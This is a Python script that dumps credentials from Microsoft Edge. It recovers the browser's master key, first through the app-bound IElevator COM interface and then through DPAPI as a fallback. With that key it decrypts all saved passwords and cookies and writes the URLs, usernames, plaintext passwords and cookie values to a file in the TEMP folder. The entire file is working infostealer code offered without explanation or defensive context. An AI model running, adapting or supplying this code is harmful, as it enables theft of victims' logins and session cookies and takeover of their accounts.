#!/usr/bin/env python3
import json, base64, os, sqlite3, shutil, tempfile, ctypes, traceback
from ctypes import wintypes, c_uint32, c_void_p, POINTER, byref
from Crypto.Cipher import AES
import comtypes
from comtypes import GUID

OUT = os.path.join(os.environ.get('TEMP','C:\\Windows\\Temp'), 'abe_dump.txt')

def log(msg):
    with open(OUT, 'a', encoding='utf-8') as f:
        f.write(msg + '\n')

CLSID = GUID("{1FCBE96C-1697-43AF-9140-2897C7C69767}")
IID = GUID("{C9C2B807-7731-4F34-81B7-44FF7779522B}")
ole32 = ctypes.oledll.ole32

class BLOB(ctypes.Structure):
    _fields_ = [("cbData", c_uint32), ("pbData", c_void_p)]

def dpapi_unprotect(data):
    class DB(ctypes.Structure):
        _fields_ = [("cbData", c_uint32), ("pbData", c_void_p)]
    c32 = ctypes.windll.crypt32
    inp = DB(cbData=len(data), pbData=ctypes.cast(ctypes.create_string_buffer(data), c_void_p))
    out = DB(cbData=0, pbData=None)
    ret = c32.CryptUnprotectData(byref(inp), None, None, None, None, 0, byref(out))
    if not ret: raise OSError(f"DPAPI err {ctypes.GetLastError()}")
    r = ctypes.string_at(out.pbData, out.cbData)
    ctypes.windll.kernel32.LocalFree(out.pbData)
    return r

def com_create():
    p = c_void_p()
    hr = ole32.CoCreateInstance(byref(CLSID), None, 4, byref(IID), byref(p))
    if hr != 0: raise OSError(f"CoCreate 0x{hr & 0xFFFFFFFF:08X}")
    return p

def com_decrypt(obj, data):
    vtbl = ctypes.cast(ctypes.cast(obj, ctypes.POINTER(ctypes.c_void_p)).contents, ctypes.POINTER(ctypes.c_void_p))
    fn = vtbl[5]
    proto = ctypes.WINFUNCTYPE(ctypes.HRESULT, c_void_p, POINTER(BLOB), POINTER(BLOB), POINTER(wintypes.DWORD))
    buf = ctypes.create_string_buffer(data)
    in_b = BLOB(cbData=len(data), pbData=ctypes.cast(buf, c_void_p))
    out_b = BLOB(cbData=0, pbData=None)
    err = wintypes.DWORD()
    hr = proto(fn)(obj, byref(in_b), byref(out_b), byref(err))
    if hr != 0: raise OSError(f"Decrypt 0x{hr & 0xFFFFFFFF:08X} err={err.value}")
    if out_b.cbData == 0: raise ValueError("empty")
    return ctypes.string_at(out_b.pbData, out_b.cbData)

def decrypt_pw(blob, key):
    if not blob or len(blob) < 3: return None
    ver = blob[:3]
    if ver in (b'v10', b'v11'):
        return AES.new(key, AES.MODE_GCM, nonce=blob[3:15]).decrypt_and_verify(blob[15:-16], blob[-16:]).decode('utf-8', errors='replace')
    if ver == b'v20':
        p = blob[3:]
        return AES.new(key, AES.MODE_GCM, nonce=p[:12]).decrypt_and_verify(p[12:-16], p[-16:]).decode('utf-8', errors='replace')
    return None

def main():
    open(OUT, 'w').write('')  # truncate
    log("starting")
    comtypes.CoInitialize()
    profile = os.environ.get('USERPROFILE', 'C:\\Users\\admin')
    edge = os.path.join(profile, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data')
    
    with open(os.path.join(edge, 'Local State'), 'r', encoding='utf-8') as f:
        ls = json.load(f)
    osc = ls.get('os_crypt', {})
    log(f"os_crypt keys: {list(osc.keys())}")
    
    aes_key = None
    source = "none"
    
    # v20 via IElevator
    ab_b64 = osc.get('app_bound_encrypted_key', '')
    if ab_b64:
        ab = base64.b64decode(ab_b64)
        blob = ab[4:]
        log(f"app_bound blob: {len(blob)} bytes")
        try:
            obj = com_create()
            log(f"COM obj: {obj}")
            aes_key = com_decrypt(obj, blob)
            source = "IElevator COM"
            log(f"AES key: {aes_key.hex()}")
        except Exception as e:
            log(f"COM failed: {e}")
    
    # v10 fallback
    if not aes_key:
        ek = osc.get('encrypted_key', '')
        if ek:
            eb = base64.b64decode(ek)
            aes_key = dpapi_unprotect(eb[5:])
            source = "v10 DPAPI"
            log(f"v10 key: {aes_key.hex()}")
    
    if not aes_key:
        log("no key recovered")
        return
    
    # Decrypt passwords
    login_db = os.path.join(edge, 'Default', 'Login Data')
    tmp = os.path.join(tempfile.gettempdir(), f"ld_{os.getpid()}")
    shutil.copy2(login_db, tmp)
    conn = sqlite3.connect(tmp)
    c = conn.cursor()
    c.execute("SELECT origin_url, username_value, password_value FROM logins ORDER BY date_created DESC")
    
    log(f"\n{'='*80}\nPASSWORDS ({source})\n{'='*80}")
    for url, user, pw_blob in c.fetchall():
        pw = None
        if pw_blob:
            try: pw = decrypt_pw(pw_blob, aes_key)
            except Exception as e: pw = f"<err: {e}>"
        log(f"{(url or '?'):<50} {(user or '?'):<30} {pw}")
    conn.close()
    os.remove(tmp)
    
    # Decrypt cookies
    ck = os.path.join(edge, 'Default', 'Network', 'Cookies')
    if os.path.exists(ck):
        shutil.copy2(ck, tmp)
        c2 = sqlite3.connect(tmp).cursor()
        c2.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE encrypted_value IS NOT NULL AND length(encrypted_value)>3")
        log(f"\n{'='*80}\nCOOKIES\n{'='*80}")
        for h, n, e in c2.fetchall():
            try:
                v = decrypt_pw(e, aes_key)
                if v: log(f"{h:40s} {n:25s} = {v[:60]}")
            except: pass
        os.remove(tmp)
    
    log("\nDONE")

if __name__ == '__main__':
    try:
        main()
    except:
        log(traceback.format_exc())